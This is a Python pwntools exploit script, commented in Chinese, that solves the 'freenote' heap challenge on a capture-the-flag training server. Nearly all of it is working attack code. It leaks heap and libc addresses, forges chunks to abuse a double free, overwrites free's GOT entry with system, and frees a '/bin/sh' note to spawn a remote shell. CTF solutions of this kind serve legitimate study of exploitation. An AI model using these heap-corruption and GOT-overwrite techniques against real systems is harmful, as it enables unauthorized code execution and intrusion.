#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" 使用了 double free 的堆利用方式
    edit note 时，程序对长度进行了校验，无法进行堆溢出
    但是可以使用 UAF 或者 double free """

import sys
from pwn import *

context(arch='i386', os='linux')
# context.log_level = 'debug'

DEBUG = False
EXE = './freenote_x86'
# BSS_HEAP_PTR = 0x0804A2EC

class Local:
    LIBC = '/lib/i386-linux-gnu/libc.so.6'
    SERVER = '127.0.0.1', 4444

class Remote:
    LIBC = 'libc-2.19.so'
    SERVER = 'pwn2.jarvisoj.com', 9885

def main():
    if DEBUG:
        config = Local
    else:
        config = Remote
    exe = ELF(EXE)
    libc = ELF(config.LIBC)
    io = remote(config.SERVER[0], config.SERVER[1])

    # leak heap base address
    for i in xrange(6):  # create note 0, 1, 2, 3, 4, 5
        io.sendlineafter('Your choice: ', '2')  # new note
        io.sendlineafter('Length of new note: ', str(256))  # length 256
        io.sendlineafter('Enter your note: ', 255 * 'A')
    for i in xrange(0, 6, 2):  # delete note 0, 2, 4
        io.sendlineafter('Your choice: ', '4')  # delete note 0, 2, 4
        io.sendlineafter('Note number: ', str(i))

    # 此时 note 2 的 fd, bk 分别应该指向 note0与note4的chunk
    io.sendlineafter('Your choice: ', '3')  # edit note 1
    io.sendlineafter('Note number: ', '1')
    io.sendlineafter('Length of note: ', str(256 + 8))  # 覆盖note2的chunk data，保留fd与bk
    io.sendlineafter('Enter your note: ', (256 + 8 - 1) * 'B')

    io.sendlineafter('Your choice: ', '1')
    out = io.recvuntil('Your choice: ')
    pos = out.find((256 + 8 - 1) * 'B' + '\n')
    note0_chunk_addr = u32(out[pos + 256 + 8:][:4])
    note0_content_addr = note0_chunk_addr + 8
    heap_base = note0_chunk_addr - 0xc10
    note1_chunk_addr = note0_chunk_addr + 256 + 8
    note1_content_addr = note1_chunk_addr + 8
    ptr_note1_content_addr = heap_base + 0x1c

    
    log.success('note0_chunk_addr = {}'.format(hex(note0_chunk_addr)))
    log.success('heap_base = {}'.format(hex(heap_base)))
    log.success('note1_chunk_addr = {}'.format(hex(note1_chunk_addr)))
    log.success('note1_content_addr = {}'.format(hex(note1_content_addr)))
    log.success('ptr_note1_content_addr = {}'.format(hex(ptr_note1_content_addr)))

    # 伪造堆信息，double free，制造可任意读写的内存指针
    payload = ''
    payload += p32(0)  # fake note1 - prev size
    payload += p32(256)  # fake note1 - size & flag
    payload += p32(ptr_note1_content_addr - 0xc)  # fake note1 - FD
    payload += p32(ptr_note1_content_addr - 0x8)  # fake note1 - BK
    payload += (256 - len(payload)) * 'C'  # padding
    payload += p32(256)  # fake note2 - prev size
    payload += p32(128)  # fate note2 - size & flag # 最低位为0，表示上一chunk未使用
    io.sendline('3')  # edit note 1
    io.sendlineafter('Note number: ', '1')
    io.sendlineafter('Length of note: ', str(len(payload) + 1))
    io.sendlineafter('Enter your note: ', payload)

    io.sendlineafter('Your choice: ', '4')  # double free note 2
    io.sendlineafter('Note number: ', '2')  # to set ptr_note1_content_addr -> ptr_note0_content_addr. 不知道为什么，反正就是成功了。。。

    # 由于之前note0被释放了，要使用的话必须再创建一次
    io.sendlineafter('Your choice: ', '2')  # new note
    io.sendlineafter('Length of new note: ', '4')  # length 0
    io.sendlineafter('Enter your note: ', 3 * 'D')

    # 修改note1内容，读取free@got
    payload = ''
    payload += p32(exe.got['free'])
    payload += p32(1)  # note 1 的有效变量
    payload += p32(4)  # note 1 的新长度
    payload += p32(note0_content_addr)  # note 0 的地址
    payload += (0x109 - len(payload)) * '\x00'

    io.sendlineafter('Your choice: ', '3')  # edit note 1
    io.sendlineafter('Note number: ', '1')
    io.sendlineafter('Length of note: ', str(0x109))  # 必须保证长度不变
    io.sendafter('Enter your note: ', payload)

    # free@got地址已经被写入note0 content
    io.sendlineafter('Your choice: ', '1')  # 读取note0内容，获取free真实地址
    out = io.recvuntil('Your choice: ')
    free_addr = u32(out[3 : 7])
    system_addr = libc.symbols['system'] - libc.symbols['free'] + free_addr
    binsh = next(libc.search('/bin/sh')) - libc.symbols['free'] + free_addr

    log.success('free_addr = {}'.format(hex(free_addr)))
    log.success('system_addr = {}'.format(hex(system_addr)))
    log.success('binsh = {}'.format(hex(binsh)))

    # 修改note0内容，即将free@got的内容改为system_addr
    io.sendline('3')  # edit note 1
    io.sendlineafter('Note number: ', '0')
    io.sendlineafter('Length of note: ', '4')  # 必须保证长度不变
    io.sendafter('Enter your note: ', p32(system_addr))

    # 创建一个/bin/sh并释放
    io.sendlineafter('Your choice: ', '2')
    io.sendlineafter('Length of new note: ', '8')
    io.sendafter('Enter your note: ', '/bin/sh\x00')

    io.sendlineafter('Your choice: ', '4')
    io.sendlineafter('Note number: ', '2')

    io.interactive()
    io.close()
    sys.exit(0)
    
main()